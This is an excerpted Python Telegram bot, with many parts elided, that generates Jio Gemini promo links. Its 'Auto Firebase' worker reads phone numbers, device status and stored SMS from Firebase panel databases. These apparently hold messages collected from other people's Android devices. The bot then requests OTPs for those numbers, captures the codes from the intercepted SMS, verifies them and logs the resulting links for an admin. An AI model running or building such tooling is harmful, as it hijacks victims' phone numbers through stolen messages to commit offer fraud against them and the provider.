        ...
        try:
            with open(settings_path, "r", encoding="utf-8") as f:
                ...
                for i, url in enumerate(extra): 
                    ...
                    if clean_url.startswith("http"): DATABASES[f"G_{i}"] = clean_url
        except Exception: pass
...
def hourly_backup_task():
    while True:
        ...
        try:
            ...
            with file_lock:
                file_exists = os.path.exists(LINKS_FILE) and os.path.getsize(LINKS_FILE) > 0
                
            if file_exists:
                total_users = len(leaderboard_data)
                total_links = sum(user.get("count", 0) for user in leaderboard_data.values())
                ...
                caption = (
                    ...
                    f"📁 <i>Attached updated <code>{LINKS_FILE}</code> file below:</i>"
                )
                ...
                bot.send_message(
                    ADMIN_ID, 
                    f"⏰ <b>Hourly Report [{time_now}]:</b> No links generated in <code>{LINKS_FILE}</code> yet."
                )
...
def send_main_menu(chat_id, first_name):
    welcome_text = (
        ...
        f"⚡️ <b>High-Speed Jio Gemini Link Generator & Auto Panel</b> 🤖\n\n"
        f"👇 <i>Choose an option below:</i>"
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🚀 Generate Jio Link (Manual)", callback_data="start_generate"))
    markup.add(InlineKeyboardButton("🤖 Auto Firebase (Sim First + SMS Heuristics)", callback_data="start_firebase_auto"))
    markup.add(InlineKeyboardButton("🔍 Link Checker Tool", callback_data="start_checker"))
    markup.add(InlineKeyboardButton("➕ Add Panels (Text/URL)", callback_data="btn_add_text"))
    markup.add(InlineKeyboardButton("📁 Upload .txt File Panels", callback_data="btn_add_file"))
    markup.add(InlineKeyboardButton("🏆 Leaderboard (Top Users)", callback_data="show_leaderboard"))
    bot.send_message(chat_id, welcome_text, reply_markup=markup)

def fmt_num(n):
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: c = c[2:]
    if len(c) == 10 and c[0] in "6789": return c
    return None

def extract_numbers_from_sms_heuristics(sender, body):
    extracted = []
    if not body: return extracted
    
    sender_upper = str(sender).upper()
    body_upper = str(body).upper()
    
    if "JIOPAY" in sender_upper or "JIO" in sender_upper or "JIO PAY" in body_upper or "JIO" in body_upper:
        found = re.findall(r"\b[6789]\d{9}\b", body)
        for num in found:
            formatted = fmt_num(num)
            if formatted: extracted.append(formatted)
...
def extract_numbers_recursively(obj):
    ...
    if isinstance(obj, dict):
        for k, v in obj.items():
            ...
            else: nums.extend(extract_numbers_recursively(v))
    elif isinstance(obj, list):
        for item in obj: nums.extend(extract_numbers_recursively(item))
    return nums
    ...
    try:
        ...
        if res.status_code == 200:
            ...
            if isinstance(data, dict):
                ...
                for dev_id in set(sim_details.keys()).union(set(info_all.keys())):
                    info_data = info_all.get(dev_id, {})
                    status_raw = info_data.get("Status", info_data.get("status", False))
                    is_online = True if str(status_raw).lower() in ["true", "online", "1"] else False
                    
                    nums = extract_numbers_recursively(sim_details.get(dev_id, {})) + extract_numbers_recursively(info_data)
                    
                    if not nums:
                        try:
                            sms_res = requests.get(f"{url}/All_Users/sms/{dev_id}.json", timeout=5)
                            if sms_res.status_code == 200:
                                sms_data = sms_res.json()
                                if isinstance(sms_data, dict):
                                    for _, sms in sms_data.items():
                                        if isinstance(sms, dict):
                                            sender = sms.get("address") or sms.get("sender") or ""
                                            body = sms.get("body") or sms.get("message") or sms.get("text") or ""
                                            nums.extend(extract_numbers_from_sms_heuristics(sender, body))
                        except Exception: pass
...
def check_gemini_status_code(url):
    ...
    try:
        ...
        if response.status_code == 200:
            if "already been used" in response.text.lower() or "redeemed" in response.text.lower():
...
def handle_start(message):
    ...
    if message.chat.type != "private":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🤖 Start in Private DM", url=f"https://t.me/{BOT_USERNAME}?start=true"))
        bot.reply_to(message, "⚠️ <b>Works only in Private Messages!</b>", reply_markup=markup)
        return
...
def show_leaderboard_callback(call):
    ...
    if not leaderboard_data:
        bot.send_message(chat_id, "🏆 <b>Leaderboard is currently empty!</b>\nBe the first to generate a link.")
        return
    ...
    for i, user in enumerate(sorted_users[:10]):
        ...
        lb_text += f"{rank} {user.get('name', 'User')} ➔ <b>{user.get('count', 0)} Links</b>\n"
...
def btn_add_text_callback(call):
    ...
    bot.send_message(call.message.chat.id, "📝 <b>Firebase URLs bhejien:</b>\nAap naye ya purane panels bhej sakte hain, ye existing list mein automatically auto-add ho jayenge.")
...
def btn_add_file_callback(call):
    ...
    bot.send_message(call.message.chat.id, "📁 <b>.txt File Bhejien:</b>\nJisme saare Firebase panel URLs saved ho.")
...
def start_checker_callback(call):
    ...
    bot.send_message(
        ...
        "👇 Apni link(s) yahan bhejien (Single link, multiple links, ya `.txt` file upload karein):",
        reply_markup=markup
    )
...
def start_generate_callback(call):
    ...
    msg = bot.send_message(chat_id, "📱 <b>Enter your Jio Mobile Number:</b>\n<i>(e.g., 9876543210)</i>")
...
def process_number_step(message):
    ...
    if not number.isdigit() or len(number) < 10:
        bot.send_message(chat_id, "❌ <b>Invalid Number!</b> Type /start to try again.")
        return
    ...
    status_msg = bot.send_message(chat_id, "⏳ <b>Sending OTP... Please wait!</b> 🔑")
    threading.Thread(target=async_send_otp, args=(chat_id, number, status_msg.message_id)).start()
...
def async_send_otp(chat_id, number, msg_id):
    try:
        ...
        if data.get("success"):
            msg = bot.send_message(chat_id, "✅ <b>OTP Sent Successfully!</b> 📩\n\n👉 <i>Enter the 6-digit OTP:</i>")
            bot.register_next_step_handler(msg, process_otp_step)
        else:
            bot.send_message(chat_id, f"❌ <b>Failed:</b> {data.get('message', 'Error')}\nType /start to retry.")
    except Exception:
        bot.send_message(chat_id, "⚠️ <b>Server Connection Slow!</b> Try /start again.")
...
def process_otp_step(message):
    ...
    if chat_id not in user_data or 'number' not in user_data[chat_id]:
        bot.send_message(chat_id, "❌ <b>Session Expired!</b> Type /start again.")
        return
        
    number = user_data[chat_id]['number']
    bot.send_message(chat_id, "⏳ <b>Verifying OTP, Generating & Checking Link Status...</b> 💎")
    
    threading.Thread(target=async_verify_otp, args=(chat_id, number, otp, message.from_user.first_name)).start()

# ==========================================
# 🤖 AUTO FIREBASE FETCH WORKER
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data == "start_firebase_auto")
def start_firebase_auto_callback(call):
    chat_id = call.message.chat.id

    bot.send_message(chat_id, "🚀 <b>Auto Firebase Engine Started!</b>\nSkipping already checked numbers and scanning live queues...")
    threading.Thread(target=run_firebase_auto_worker, args=(chat_id, call.from_user.first_name)).start()

def run_firebase_auto_worker(chat_id, first_name):
    load_saved_panels()
    if not DATABASES:
        print("[-] [AUTO WORKER] No Firebase panels found in settings.json!")
        bot.send_message(chat_id, "❌ No Firebase panels found! Add them via text or file.")
        return
        ...
        for dev in devices:
            ...
            for num in dev["numbers"]:
                if num in successfully_checked_cache:
                    print(f"   [SKIPPED] Number {num} already checked before.")
                    continue
    ...
    if not all_found_targets:
        ...
        bot.send_message(chat_id, "⚠️ Saare numbers pehle hi check ho chuke hain ya koi naya number nahi mila.")
        return

    print(f"\n[+] [AUTO WORKER] New Target Numbers Loaded: {len(all_found_targets)}")
    bot.send_message(chat_id, f"📱 Found <b>{len(all_found_targets)}</b> unchecked numbers. Processing live queues...")
    ...
    for index, target in enumerate(all_found_targets[:10], start=1):  
        ...
        print(f"\n👉 [QUEUE] Processing Number [{index}/{len(all_found_targets)}]: {phone} | Online: {is_online}")

        try:
            session = requests.Session()
            res = session.post(BASE_URL, data={"action": "send_otp", "number": phone}, headers=HEADERS, timeout=10)
            data = res.json()

            if data.get("success"):
                print(f"   [+] [OTP SENT] Successfully requested OTP for {phone}. Waiting for SMS...")
                ...
                if not otp_found and (time.time() - start_time) > 25:
                    print(f"   [-] [TIMEOUT] OTP SMS capture timed out for number: {phone}")

                if otp_found:
                    print(f"   [+] [OTP CAUGHT] Captured OTP '{otp_found}' for {phone}. Verifying...")
                    verify_res = session.post(BASE_URL, data={"action": "verify_otp", "number": phone, "otp": otp_found}, headers=HEADERS, timeout=12)
                    ...
                    if v_data.get("success"):
                        ...
                        print(f"   🎉 [LINK FOUND] Number: {phone} | Status: {status} | Link: {link}")
                        ...
                        with file_lock:
                            with open(LINKS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{time_now}] Auto Name: {first_name} | Number: {phone} | Status: {status} | Link: {link}\n")
                        ...
                        print(f"   [-] [VERIFY FAILED] Could not verify OTP for {phone}")
                else:
                    print(f"   [-] [TIMEOUT] No SMS received for {phone}")
            else:
                print(f"   [-] [OTP FAILED] Request blocked or failed for {phone}")
        except Exception as e:
...
def handle_text_inputs(message):
    ...
    if state == "TEXT_URLS":
        ...
        USER_WAITING_FOR.pop(user_id, None)
        bot.reply_to(message, f"✅ Auto-added <b>{added}</b> new URLs!\nTotal Panels: {total}", parse_mode="HTML")
        ...
        if not links:
            bot.reply_to(message, "⚠️ Koi valid HTTP/HTTPS link nahi mila. Dobara bhejein.")
            return
            
        bot.reply_to(message, f"⏳ Checking {len(links)} link(s)... Please wait.")
        
        result_text = "🔍 <b>LINK CHECKER RESULTS</b> 🔍\n\n"
        for idx, url in enumerate(links[:15], start=1):
            status = check_gemini_status_code(url)
            result_text += f"{idx}. <code>{url}</code>\n➔ Status: <b>{status}</b>\n\n"
            
        markup = InlineKeyboardMarkup()
        for u in links[:5]:
            markup.add(InlineKeyboardButton(f"🔗 Open Link", url=u))
        markup.add(InlineKeyboardButton("🔄 Check More Links", callback_data="start_checker"))
    ...
    if user_id in USER_WAITING_FOR:
        ...
        if doc.file_name.endswith(".txt"):
            ...
            if state == "TXT_FILE":
                ...
                USER_WAITING_FOR.pop(user_id, None)
                bot.reply_to(message, f"✅ Auto-added <b>{added}</b> URLs from file!\nTotal Panels: {total}", parse_mode="HTML")
                
            elif state == "LINK_CHECKER":
                links = re.findall(r'https?://[^\s]+', content)
                if not links:
                    bot.reply_to(message, "⚠️ File ke andar koi valid link nahi mila.")
                    return
                    
                bot.reply_to(message, f"⏳ Checking {len(links)} links from file...")
...
def async_verify_otp(chat_id, number, otp, first_name):
    try:
        session = user_data[chat_id]['session']
        res = session.post(BASE_URL, data={"action": "verify_otp", "number": number, "otp": otp}, headers=HEADERS, timeout=12)
        data = res.json()
        ...
        if data.get("success"):
            ...
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔗 Open Gemini Link", url=link))
            markup.add(InlineKeyboardButton("🚀 Generate Another Link", callback_data="start_generate"))
            ...
            with file_lock:
                with open(LINKS_FILE, "a", encoding="utf-8") as f:
                    f.write(f"[{time_now}] Name: {first_name} | Number: {number} | Status: {status} | Link: {link}\n")
            ...
            admin_msg = (
                ...
                f"📈 <b>Total Links by User:</b> {leaderboard_data[user_id_str]['count']}\n"
                f"📱 <b>Number:</b> <code>{number}</code>\n"
                f"📊 <b>Status:</b> <code>{status}</code>\n"
                f"🔗 <b>Link:</b>\n<code>{link}</code>"
            )
            try: bot.send_message(ADMIN_ID, admin_msg, reply_markup=admin_markup)
            except: pass
            
        else:
            bot.send_message(chat_id, f"❌ <b>Verification Failed:</b> {data.get('message', 'Invalid OTP')}\nType /start to try again.")
            
    except Exception:
        bot.send_message(chat_id, "⚠️ <b>Server Response Timeout!</b> Try again later.")
    finally:
        with memory_lock:
...
if __name__ == "__main__":
    ...
    print(f"📁 Saving data to {LINKS_FILE}, {FRESH_FILE}, {REDEEMED_FILE} & {SCANNED_NUMBERS_FILE}")
